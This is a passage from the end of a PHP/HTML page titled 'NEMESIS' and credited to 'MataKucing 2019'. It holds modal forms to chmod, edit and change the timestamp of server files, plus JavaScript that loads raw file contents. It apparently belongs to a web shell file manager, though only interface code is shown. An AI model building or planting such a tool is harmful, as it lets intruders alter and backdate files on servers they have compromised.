        <button type="button" onclick="closeModal('chmodModal')">Cancel</button>
    </form>
</div>

<div id="timestampModal" class="modal">
    <h2>Change Timestamp</h2>
    <form action="" method="post">
        <input type="hidden" name="target" id="timestampTarget">
        <input type="datetime-local" name="timestamp" required>
        <button type="submit" name="action" value="touch">Apply</button>
        <button type="button" onclick="closeModal('timestampModal')">Cancel</button>
    </form>
</div>

<div id="editorModal" class="modal">
    <h2>Edit File</h2>
    <form action="" method="post">
        <input type="hidden" name="target" id="editTarget">
        <textarea name="file_content" id="fileContent" spellcheck="false"></textarea>
        <button type="submit" name="action" value="edit_file">Save</button>
        <button type="button" onclick="closeModal('editorModal')">Cancel</button>
    </form>
</div>

<!-- ─── FOOTER ─────────────────────────────────────────────── -->
<div class="footer">
    <b>NEMESIS</b> <span class="dot"></span> Created by <b>MataKucing 2019</b> <span class="dot"></span> <?= date('Y') ?>
</div>

<script>
    function showForm(id) {
        const el = document.getElementById(id);
        if (el) el.style.display = 'flex';
    }
    function hideForm(id) {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    }
    function toggleForm(id) {
        const el = document.getElementById(id);
        if (!el) return;
        el.style.display = (el.style.display === 'flex') ? 'none' : 'flex';
    }

    function showModal(id) {
        document.getElementById('modalBackdrop').classList.add('open');
        document.getElementById(id).classList.add('open');
    }
    function closeModal(id) {
        document.getElementById(id).classList.remove('open');
        const anyOpen = document.querySelectorAll('.modal.open').length > 0;
        if (!anyOpen) document.getElementById('modalBackdrop').classList.remove('open');
    }
    function closeAllModals() {
        document.querySelectorAll('.modal.open').forEach(m => m.classList.remove('open'));
        document.getElementById('modalBackdrop').classList.remove('open');
    }

    function openRenameModal(target) {
        document.getElementById('renameTarget').value = target;
        showModal('renameModal');
    }
    function openChmodModal(target) {
        document.getElementById('chmodTarget').value = target;
        showModal('chmodModal');
    }
    function openTimestampModal(target) {
        document.getElementById('timestampTarget').value = target;
        showModal('timestampModal');
    }
    function openEditor(file) {
        document.getElementById('editTarget').value = file;
        fetch('?path=<?= urlencode($current_path) ?>&file=' + encodeURIComponent(file) + '&raw=true')
            .then(response => response.text())
            .then(data => {
                document.getElementById('fileContent').value = data;
                showModal('editorModal');
            })
            .catch(err => {
                document.getElementById('fileContent').value = 'Error loading file: ' + err.message;
                showModal('editorModal');
            });
    }

    // ESC to close modals
    document.addEventListener('keydown', e => {
        if (e.key === 'Escape') closeAllModals();
    });
</script>
</body>
</html>